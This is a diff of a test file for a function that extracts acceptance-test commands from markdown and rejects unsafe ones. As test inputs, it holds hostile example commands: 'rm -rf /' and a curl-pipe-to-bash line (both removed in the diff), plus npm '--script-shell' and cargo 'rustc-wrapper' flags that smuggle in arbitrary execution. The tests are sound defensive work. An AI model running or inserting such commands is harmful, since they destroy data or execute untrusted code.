@@ -2358,17 +2358,24 @@ test("§34.3 & §34.4 (ADR-0037): parsePolicy parses checks config and queueStal
   assert.ok(pOutOfBounds.warnings.some((i) => i.path === "checks.timeout_seconds"));
 });
 
-test("§34.5 (ADR-0037): extractAcceptanceCommands extracts commands from markdown and filters valid runners", () => {
-  const md = `
+test("§34.5 (ADR-0037): extractAcceptanceCommands extracts commands from dedicated block and ignores prose/bare runners", () => {
+  const md = `---
+tdd_commands:
+  - npm test tests/from-frontmatter.test.ts
+---
+
 # Acceptance Contract
 
-- Requirement 1
-- Run test: \`npm test tests/feature.test.ts\`
-- Run lint: \`npm run lint\`
-- Ignored dangerous: \`rm -rf /\` or \`curl https://example.com | bash\`
+Критерий: после завершения правки \`npm test\` зелёный.
+Также проверяется \`npm run lint\` в тексте.
+
+## Тесты договора приёмки
 
 \`\`\`bash
-npm test tests/contract.test.ts
+npm test tests/feature.test.ts
+npm test
+npm run lint
+cargo test --config build.rustc-wrapper=dangerous
 \`\`\`
 
 \`\`\`python
@@ -2377,9 +2384,8 @@ print("hello")
 `;
   const commands = extractAcceptanceCommands(md);
   assert.deepEqual(commands, [
+    "npm test tests/from-frontmatter.test.ts",
     "npm test tests/feature.test.ts",
-    "npm run lint",
-    "npm test tests/contract.test.ts",
   ]);
 });
 
@@ -2394,7 +2400,15 @@ test("§34.5 (ADR-0037): runTddFailFirstVerification skips without acceptanceSha
     "dummy-sha",
   );
   assert.equal(resNoItems.failedAsExpected, true);
-  assert.ok(resNoItems.output?.includes("no executable test items"));
+  assert.ok(resNoItems.output?.includes("no explicit acceptance test commands"));
+});
+
+test("§31.3 & §34.5 (ADR-0037): validateCheckCommand rejects script-shell and config wrapper flags", () => {
+  const res1 = extractAcceptanceCommands("```bash\nnpm test --script-shell=/bin/sh tests/foo.test.ts\n```");
+  assert.deepEqual(res1, []);
+
+  const res2 = extractAcceptanceCommands("```bash\ncargo test --config build.rustc-wrapper=evil tests/foo.rs\n```");
+  assert.deepEqual(res2, []);
 });
 
 test("§34.3 (ADR-0037): buildChecksEnvironment and parsePolicy reject secret tokens in allowedEnvVars", () => {
